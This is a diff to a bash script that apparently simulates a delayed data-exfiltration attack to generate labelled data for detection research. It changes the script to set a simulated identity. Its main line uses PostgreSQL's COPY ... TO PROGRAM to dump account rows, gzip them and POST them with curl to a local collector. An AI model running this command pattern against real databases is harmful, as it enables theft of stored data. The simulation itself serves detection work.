@@ -1,10 +1,14 @@
 #!/bin/bash
+cd "$(dirname "${BASH_SOURCE[0]}")"
+source ./_identity_lib.sh
+casce_new_identity
+echo "  identity=${CASCE_USER}@${CASCE_IP}"
 echo "Simulating Data Exfiltration Attack B (Delayed 2s)..."
 
 /dataset_workspace/logger.sh mark_attack "attack_exfiltration_delayed_2s" start
 
 # Adding a 2-second sleep before the external process connects to test temporal similarity algorithms
-psql -U postgres -d casce_tpcb -c "COPY (SELECT * FROM pgbench_accounts LIMIT 500) TO PROGRAM 'sleep 2 && gzip > /tmp/accounts_exfil_b.gz && curl -s -X POST -d @/tmp/accounts_exfil_b.gz http://127.0.0.1:9090 > /dev/null 2>&1 || true';"
+psql -U postgres -d casce_tpcb -c "$(casce_sql_prelude)COPY (SELECT * FROM pgbench_accounts LIMIT 500) TO PROGRAM 'sleep 2 && gzip > /tmp/accounts_exfil_b.gz && curl -s -X POST -d @/tmp/accounts_exfil_b.gz http://127.0.0.1:9090 > /dev/null 2>&1 || true';"
 
 /dataset_workspace/logger.sh mark_attack "attack_exfiltration_delayed_2s" end
 
